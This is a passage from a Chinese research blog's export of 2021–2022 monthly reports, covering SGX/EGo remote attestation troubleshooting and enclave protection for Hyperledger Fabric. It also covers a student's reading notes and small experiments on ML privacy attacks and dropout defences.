<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/9.png"></div>

<p>&emsp;&emsp;sgx远程认证有两种，基于ECDSA（椭圆曲线）算法和EPID的。此处必须先更新电脑BIOS至最新版本，然后关闭BIOS中的Hyper-Threading，然后才可以运行成功。（红框圈出了的认证过程有时依然会失败，原因未知）<br>&emsp;&emsp;运行QuoteGeneration（生成证明）成功：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/10.png"></div>

<p>&emsp;&emsp;运行QuoteVerification（验证证明）有warning：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/11.png"></div>

<p>&emsp;&emsp;验证时产生warning，查阅得知a008错误：<br><code>TCB level of the platform is up to date, but additional configuration of the platform at its current patching level may be needed. Moreover, SGX SW Hardening is also needed.</code><br>&emsp;&emsp;不知道这个TCB level过期是什么意思，找了很多解决办法都不行，网上也有说要在BIOS关闭Internal Graphic，在实验室电脑BIOS上未找到该设置。<br>&emsp;&emsp;运行ego的远程认证失败：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/12.png"></div>

<p>&emsp;&emsp;这个也是提示TCB level无效，应该是和上面同样的错误。</p>
<h2 id="存在的问题-3"><a href="#存在的问题-3" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;ego认证过程会报错TCB level失效，未找到解决方法。</p>
<h2 id="下周工作计划-3"><a href="#下周工作计划-3" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;解决TCB level问题，尽可能运行ego的远程认证。</p>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Hyperledger Fabric</tag>
        <tag>SGX</tag>
        <tag>EGo</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年3月科研月报（区块链版）</title>
    <url>/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;寻找针对fabric运行环境的攻击方式，创建多个enclave，保护程序、文件安全，添加远程证明，实现enclave间的互信。</p>
<h1 id="本月规划"><a href="#本月规划" class="headerlink" title="本月规划"></a>本月规划</h1><p>&emsp;&emsp;完成基本Enclave、远程认证架构。</p>
<h1 id="第一周-2022-02-21-–-2021-02-27"><a href="#第一周-2022-02-21-–-2021-02-27" class="headerlink" title="第一周 2022/02/21 – 2021/02/27"></a>第一周 2022/02/21 – 2021/02/27</h1><h2 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li>写项目书<br>&emsp;&emsp;本周周一到周三都在写项目书技术路线，周四、周五、周日还在进行各种更改。</li>
<li>尝试远程证明<br>&emsp;&emsp;本周空余时间继续尝试SGX和EGo的远程证明，SGX正常运行，EGo依然报错，但错误与去年不同，这次显示crl过期，不知道原因。</li>
<li>完善论文<br>&emsp;&emsp;仔细看了批注之后，我认为还是加不了远程证明，需要的时间太长了。可以进一步调研区块链智能合约的隐私问题，并进行内容完善。可以丰富评估内容，添加其他性能评估和安全评估。</li>
</ol>
<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><ol>
<li>远程证明无法使用，并且远程证明也不好加入，需要修改peer和chaincode两侧的通信协议。没有那么多时间。</li>
<li>无法与其他工作对比。首先，有许多工作不是fabric平台，对比没有意义。其次，其他fabric平台需要搭建环境，并且对比需要运行同样的链码，去年搭建时失败。</li>
</ol>
<h2 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;写完论文</p>
<h1 id="第二周-2022-02-28-–-2021-03-06"><a href="#第二周-2022-02-28-–-2021-03-06" class="headerlink" title="第二周 2022/02/28 – 2021/03/06"></a>第二周 2022/02/28 – 2021/03/06</h1><h2 id="本周工作情况和进展-1"><a href="#本周工作情况和进展-1" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li>完善区块链论文<br>&emsp;&emsp;周一-周三完善论文，对多个论文提到的区块链智能合约隐私安全问题进行总结，添加远程认证框架，添加针对各种攻击的防御分析，丰富论文内容。</li>
<li>Enclave保护密钥文件<br>&emsp;&emsp;由于远程认证存在较多问题，先对框架其他部分进行实现，周四周五实现密钥文件放入Enclave中进行保护。<br>&emsp;&emsp;开题时原预设框架如下图：<br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%89%88%EF%BC%89/1.png"></div><br>&emsp;&emsp;右侧Enclave容器内容较少，原计划将整个docker容器放入enclave中，但未找到docker容器放入Enclave的相关论文和实现方法。分析过后，链码容器中只有五个重要的密钥文件和证书，容器相比文件更大，因此只将五个证书放入可以进一步减少加载进Enclave的内存。<br>&emsp;&emsp;本周已实现右边部分，左边部分peer侧结构和链码不同，链码是后续上传载入的，而peer是网络启动时运行的，因此需要进一步分析，创建Enclave。</li>
</ol>
<h2 id="存在的问题-1"><a href="#存在的问题-1" class="headerlink" title="存在的问题"></a>存在的问题</h2><ol>
<li>远程认证未实现，需要进一步调研解决</li>
<li>Peer侧程序和证书未加入enclave，peer容器需要配置可信镜像环境</li>
</ol>
<h2 id="下周工作计划-1"><a href="#下周工作计划-1" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;首先实现peer侧可信镜像环境构建，创建配备SGX的peer容器。然后分析peer侧启动流程，为peer程序创建Enclave。最后同样将peer容器中重要证书和密钥放入Enclave中保护。</p>
<h1 id="第三周-2022-03-07-–-2021-03-13"><a href="#第三周-2022-03-07-–-2021-03-13" class="headerlink" title="第三周 2022/03/07 – 2021/03/13"></a>第三周 2022/03/07 – 2021/03/13</h1><h2 id="本周工作情况和进展-2"><a href="#本周工作情况和进展-2" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li>完善论文+创建eFabric镜像<br>&emsp;&emsp;在编写peer可信镜像时，如果采用他人的SGX镜像，需要加载大量数据，导致镜像很大，1G-2G左右。并且该镜像是在DockerHub上找的，在论文中使用没有依据。因此我基于该镜像构建方式，构建eFabric/base镜像，作为链码、peer镜像的父镜像。</li>
<li>Peer可信镜像构建<br>&emsp;&emsp;经过分析，peer镜像构建主要是在dockerfile中，而源码中涉及较少。因此以golang镜像作为编译镜像，以eFabric/base作为运行父镜像，采用双阶段不同镜像的使用方式，可以缩减镜像体积。</li>
</ol>
<h2 id="存在的问题-2"><a href="#存在的问题-2" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;Peer镜像虽然具备了SGX和EGo环境，但还是缺乏sgx驱动，需要外部挂载。Peer容器与链码容器启动方式不同，目前还没有找到挂载点。</p>
<h2 id="下周工作计划-2"><a href="#下周工作计划-2" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;找到peer镜像sgx驱动的挂载点，实现peer可信容器的创建，将peer程序和证书密钥都放入Enclave中保护。</p>
<h1 id="第四周-2022-03-14-–-2021-03-20"><a href="#第四周-2022-03-14-–-2021-03-20" class="headerlink" title="第四周 2022/03/14 – 2021/03/20"></a>第四周 2022/03/14 – 2021/03/20</h1><h2 id="本周工作情况和进展-3"><a href="#本周工作情况和进展-3" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li>完善多Enclave架构<br>&emsp;&emsp;由于peer生命周期和链码差异较大，链码生命周期在Fabric编译时决定，而peer的生命周期由用户文件决定。Peer容器的配置都由用户的docker-compose文件设置，因此挂载点就在此处。同样，peer程序运行依赖大量的环境变量和密钥等文件，需要将环境变量传递进Enclave中，将文件挂载入Enclave。<br>&emsp;&emsp;但程序在Enclave中运行后会意外停止，并且没有错误爆出，未找到错误点，怀疑是缺少一些环境变量。</li>
<li>修改论文<br>&emsp;&emsp;重新阅读FPC论文后发现，作者在论文中评估了TCB大小和性能数据。作者使用系统代码中可信部分的行数作为TCB大小的评估依据，并把FPC与原始Fabric进行性能比较，得出性能百分比为80%-95%。</li>
</ol>
<h2 id="存在的问题-3"><a href="#存在的问题-3" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;目前peer Enclave可以成功创建，但程序会运行后意外停止，并且没有报错。</p>
<h2 id="下周工作计划-3"><a href="#下周工作计划-3" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;继续完善该框架，找到代码错误位置，添加缺少的环境变量或者文件。</p>
<h1 id="第五周-2022-03-21-–-2021-03-27"><a href="#第五周-2022-03-21-–-2021-03-27" class="headerlink" title="第五周 2022/03/21 – 2021/03/27"></a>第五周 2022/03/21 – 2021/03/27</h1><h2 id="本周工作情况和进展-4"><a href="#本周工作情况和进展-4" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li>修改论文<br>&emsp;&emsp;添加了远程证明相关接口和说明。</li>
<li>Debug<br>&emsp;&emsp;Enclave添加环境变量后peer容器可以正常启动。<br>&emsp;&emsp;Peer侧生命周期包括peer容器创建与启动、创建通道、安装链码。Peer容器内部设置通过docker-compose实现。<br>&emsp;&emsp;错误出在链码安装部分，容器意外停止，导致通道关闭：<br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%89%88%EF%BC%89/2.png"></div><br>&emsp;&emsp;而docker logs查看容器情况如下：<br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%89%88%EF%BC%89/3.png"></div><br>&emsp;&emsp;报出内存不够错误，而不使用peer enclave则不会报错。然而enclave内部没有放账本、区块等结构，不应该会报出内存错误。</li>
</ol>
<h2 id="下周工作计划-4"><a href="#下周工作计划-4" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;根据链码安装流程，找出报错点。<br>&emsp;&emsp;检查enclave配置文件，检查映射文件、挂载文件是否过大，减少enclave内存大小。</p>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Hyperledger Fabric</tag>
        <tag>SGX</tag>
        <tag>EGo</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年3月科研月报（人工智能版）</title>
    <url>/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;学习《动手学深度学习》课程，尽快入门学会深度学习基本知识和编程。</p>
<h1 id="本月规划"><a href="#本月规划" class="headerlink" title="本月规划"></a>本月规划</h1><p>&emsp;&emsp;阅读深度学习论文，学习网课，学会CNN相关知识。</p>
<h1 id="第一周-2022-02-28-–-2021-03-06"><a href="#第一周-2022-02-28-–-2021-03-06" class="headerlink" title="第一周 2022/02/28 – 2021/03/06"></a>第一周 2022/02/28 – 2021/03/06</h1><h2 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li><p>写论文<br>&emsp;&emsp;完善区块链论文（在本周报不展开说明）</p>
</li>
<li><p>阅读论文<br>&emsp;&emsp;本周阅读了三篇论文（上周遗留的一篇）：<br>&emsp;&emsp;Machine Learning Models that Remember Too Much：利用网络隐藏信息，设计到部分信息隐藏知识<br>&emsp;&emsp;Overlearning Reveals Sensitive Attributes：神经网络记录信息过多，包括各种敏感信息，可以利用特征推导敏感属性，或者将模型重训练来预测敏感属性<br>&emsp;&emsp;Adversarial Learning of Privacy-Preserving and Task-Oriented Representations：对抗训练模型保护隐私，使解码器效果变差。</p>
</li>
<li><p>运行实验<br>&emsp;&emsp;本周初步运行了论文《Neural Network Inversion in Adversarial Setting via Background Knowledge Alignment》中的攻击实验。<br>&emsp;&emsp;针对猜想：模型越小，反演攻击效果是否越差？进行三组实验，分别设置模型ndf为128（loss1橙色）、64（loss2蓝色）、5（loss5红色），进行100轮训练，损失变化和对比如下图：<br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%89%88%EF%BC%89/1.jpg"></div><br>&emsp;&emsp;虽然随着模型变小，攻击的损失会增大，效果变差，但是差距不大，loss差距在0.002左右，并且图片对比差距也很小。因此得出初步结论：攻击效果与模型大小没有较强关系。</p>
</li>
</ol>
<h2 id="二，存在的问题"><a href="#二，存在的问题" class="headerlink" title="二，存在的问题"></a>二，存在的问题</h2><p>&emsp;&emsp;本周阅读论文、运行实验时，并不能很好理解代码和公式，尤其是CNN相关内容。缺乏CNN知识。</p>
<h2 id="三，下周工作计划"><a href="#三，下周工作计划" class="headerlink" title="三，下周工作计划"></a>三，下周工作计划</h2><ol>
<li>学习CNN视频</li>
<li>阅读新的论文</li>
<li>运行上周论文实验</li>
</ol>
<h1 id="第二周-2022-03-07-—-2022-03-13"><a href="#第二周-2022-03-07-—-2022-03-13" class="headerlink" title="第二周 2022/03/07 — 2022/03/13"></a>第二周 2022/03/07 — 2022/03/13</h1><h2 id="一，本周工作情况和进展"><a href="#一，本周工作情况和进展" class="headerlink" title="一，本周工作情况和进展"></a>一，本周工作情况和进展</h2><ol>
<li><p>阅读论文<br>&emsp;&emsp;本周阅读了两篇论文：<br>&emsp;&emsp;The Secret Revealer: Generative Model-Inversion Attacks Against Deep Neural Networks：通过GAN来生成图片，并恢复图像中的敏感数据。<br>&emsp;&emsp;Model inversion attacks against collaborative inference：虽然标题是合作推理，但就是partition的场景下进行模型反演攻击，分别在白盒场景、可query黑盒场景、不可query黑盒场景下进行测试。</p>
</li>
<li><p>学习网课<br>&emsp;&emsp;本周学习了《动手学深度学习》16节-21节的内容，重点是卷积层，理解了图像卷积的操作，以及通道、填充、步幅、卷积核等超参数的作用。</p>
</li>
</ol>
<h2 id="二，存在的问题-1"><a href="#二，存在的问题-1" class="headerlink" title="二，存在的问题"></a>二，存在的问题</h2><p>&emsp;&emsp;第一篇论文中有多个loss公式没看懂。<br>&emsp;&emsp;第二篇论文中。白盒场景虽然可以获得参数，但并没有使用，构造了x<sub>0</sub>，减少f(x<sub>0</sub>)和f(x)的loss（3a），同时使用（3b）公式计算图片的平滑度，从而使构造的x<sub>0</sub>逼近原输入x</p>
<p><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%89%88%EF%BC%89/2.jpg"></div><br>&emsp;&emsp;可是这样不还是黑盒吗？个人比较疑惑，可以在下周开会时进行探讨。</p>
<h2 id="三，下周工作计划-1"><a href="#三，下周工作计划-1" class="headerlink" title="三，下周工作计划"></a>三，下周工作计划</h2><ol>
<li>继续学习CNN</li>
<li>阅读论文</li>
<li>能够改一改代码，跑实验</li>
</ol>
<h1 id="第三周-2022-03-14-—-2022-03-20"><a href="#第三周-2022-03-14-—-2022-03-20" class="headerlink" title="第三周 2022/03/14 — 2022/03/20"></a>第三周 2022/03/14 — 2022/03/20</h1><h2 id="一，本周工作情况和进展-1"><a href="#一，本周工作情况和进展-1" class="headerlink" title="一，本周工作情况和进展"></a>一，本周工作情况和进展</h2><ol>
<li><p>阅读论文<br>&emsp;&emsp;本周阅读了两篇论文：<br>&emsp;&emsp;Property Inference Attacks Against GANs：对GAN进行属性推理攻击，分为全黑盒（输入随机）和部分黑盒（可以控制输入的特征向量）攻击，部分黑盒攻击时训练多个影子GAN模型，两种攻击都训练额外的分类器对GAN的输出进行分类，并根据分类结果推测属性占比。本论文的测试非常丰富，包含各种影响因素，如训练样本数、影子模型数、分类器结构和数据分布等。<br>&emsp;&emsp;Attacking and Protecting Data Privacy in Edge–Cloud Collaborative Inference Systems：该篇论文和上周论文的理论部分完全一致，属于会议论文修改30%再投期刊，但两篇论文测试不同，本论文重点测试防御方法，如加噪音、在不同层采用丢弃法、模型分割位置等，在中间层加噪音、更深的层采用丢弃法、在更深的层进行分割（至少包含一个全连接层），防御效果更好。</p>
</li>
<li><p>实验<br>&emsp;&emsp;编写AlexNet，并对CIFAR10数据集进行测试。<br>&emsp;&emsp;原AlexNet针对的是3x224x224的图片，卷积层会压缩到非常小，而CIFAR10是3x32x32的大小，需要更改网络参数。<br>&emsp;&emsp;测试结果如下：<br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%89%88%EF%BC%89/3.jpg"></div><br><div align="center"><img src="/2022/04/01/2022%E5%B9%B43%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5%EF%BC%88%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%89%88%EF%BC%89/4.jpg"></div><br>&emsp;&emsp;训练50轮时会有严重的过拟合，训练到23轮左右可以得到最低的loss，准确率为70%。</p>
</li>
</ol>
<h2 id="二，存在的问题-2"><a href="#二，存在的问题-2" class="headerlink" title="二，存在的问题"></a>二，存在的问题</h2><p>&emsp;&emsp;第一篇论文是针对GAN的属性推理攻击，但在最后迁移到了成员推理攻击，该部分没看懂，尤其是三个公式。</p>
<h2 id="三，下周工作计划-2"><a href="#三，下周工作计划-2" class="headerlink" title="三，下周工作计划"></a>三，下周工作计划</h2><ol>
<li>阅读论文</li>
<li>学习自注意力机制</li>
</ol>
<h1 id="第四周-2022-03-21-—-2022-03-27"><a href="#第四周-2022-03-21-—-2022-03-27" class="headerlink" title="第四周 2022/03/21 — 2022/03/27"></a>第四周 2022/03/21 — 2022/03/27</h1><h2 id="一，本周工作情况和进展-2"><a href="#一，本周工作情况和进展-2" class="headerlink" title="一，本周工作情况和进展"></a>一，本周工作情况和进展</h2><ol>
<li><p>阅读论文<br>&emsp;&emsp;本周阅读了两篇论文：（任务有三篇，但截止到27号有一篇没看完）<br>&emsp;&emsp;Updates-Leak: Data Set Inference and Reconstruction Attacks in Online Learning：在模型更新场景下窃取更新数据集label或者重构数据集。在黑盒场景下，设置四种攻击，单例更新集推测label，单例更新集重构，多例更新集推测label分布，多例更新集重构。四种攻击都采用了AutoEncoder类似架构，而在多例更新集重构中使用Generator作为Decoder，并使用聚类方法来进行选择重构图像。<br>&emsp;&emsp;ActiveThief: Model Extraction Using Active Learning and Unannotated Public Data：使用与目标模型同类型同内容的公开数据集作为query数据，在query后使用四种子集选择策略选择下一次query的数据。</p>
</li>
<li><p>实验<br>&emsp;&emsp;本周使用了Attacking and Protecting Data Privacy in Edge–Cloud Collaborative Inference Systems论文中的Dropout防御方法，dropout用在vgg，并对dropout率进行测试，结果如下：</p>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>Dropout Rate</th>
<th>分类准确率</th>
<th>反演ssim</th>
</tr>
</thead>
<tbody>
<tr>
<td>0.5</td>
<td>85.2</td>
<td>0.6</td>
</tr>
<tr>
<td>0.7</td>
<td>84.26</td>
<td>0.46</td>
</tr>
<tr>
<td>0.8</td>
<td>83.63</td>
<td>0.36</td>
</tr>
<tr>
<td>0.9</td>
<td>81.84</td>
<td>0.2</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li>网课学习<br>&emsp;&emsp;本周匆忙地学习了注意力相关内容，初步了解相关含义，但注意力例子都是在seq2seq上的，transformer也是，因此不是很理解，需要补充seq2seq相关知识。</li>
</ol>
<h2 id="二，存在的问题-3"><a href="#二，存在的问题-3" class="headerlink" title="二，存在的问题"></a>二，存在的问题</h2><ol>
<li>Updates-Leak：多个更新集中，不理解推测label分布，获得各label数目？在多例更新重构中，Best-Match loss中前一个是交叉熵损失，越小越好，后一个是Discriminator判别结果，这个应该越大越好，不理解为什么是相加。</li>
<li>ActiveThief：只是添加了选择策略，loss使用目标网络和影子模型的label差异，感觉只是训练了一个功能相似的模型，对窃取的效果感到怀疑。</li>
</ol>
<h2 id="三，下周工作计划-3"><a href="#三，下周工作计划-3" class="headerlink" title="三，下周工作计划"></a>三，下周工作计划</h2><ol>
<li>学习网课</li>
<li>完成论文阅读</li>
<li>完成Dropout实验</li>
</ol>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Deep Learning</tag>
        <tag>Trustworthy Machine Learning</tag>
        <tag>Privacy</tag>
      </tags>
  </entry>
</search>
